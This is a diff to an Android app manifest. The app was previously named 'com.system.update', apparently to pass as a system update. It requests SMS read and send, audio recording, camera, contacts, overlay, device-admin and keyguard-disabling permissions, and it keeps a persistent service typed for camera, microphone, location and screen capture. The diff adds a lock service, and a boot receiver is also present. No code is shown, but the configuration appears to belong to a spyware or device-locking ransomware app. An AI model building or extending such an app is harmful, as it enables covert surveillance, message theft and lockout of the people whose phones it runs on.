@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.system.update">
+    xmlns:tools="http://schemas.android.com/tools">
 
     <!-- ============ NETWORK ============ -->
     <uses-permission android:name="android.permission.INTERNET"/>
@@ -28,12 +27,15 @@
     <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
     <uses-feature android:name="android.hardware.camera.flash" android:required="false"/>
 
+    <!-- ============ AUDIO ============ -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+
     <!-- ============ SMS ============ -->
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_MMS"/>
-    <uses-permission android:name="android.permission.READ_MMS"/>
 
     <!-- ============ STORAGE / MEDIA ============ -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
@@ -58,9 +60,9 @@
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
     <uses-permission android:name="android.permission.CALL_PHONE"/>
-    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
     <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
 
     <!-- ============ SYSTEM / OVERLAY ============ -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
@@ -70,8 +72,6 @@
         tools:ignore="QueryAllPackagesPermission"/>
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
     <uses-permission android:name="android.permission.REORDER_TASKS"/>
-    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
-    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
 
     <!-- ============ DEVICE ADMIN ============ -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
@@ -112,6 +112,13 @@
             android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection"
             android:stopWithTask="false"/>
 
+        <!-- ============ LOCK SERVICE ============ -->
+        <service
+            android:name=".LockService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false"/>
+
         <!-- ============ DEVICE ADMIN RECEIVER ============ -->
         <receiver
             android:name=".AdminReceiver"
@@ -127,7 +134,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ BOOT RECEIVER (auto start) ============ -->
+        <!-- ============ BOOT RECEIVER ============ -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
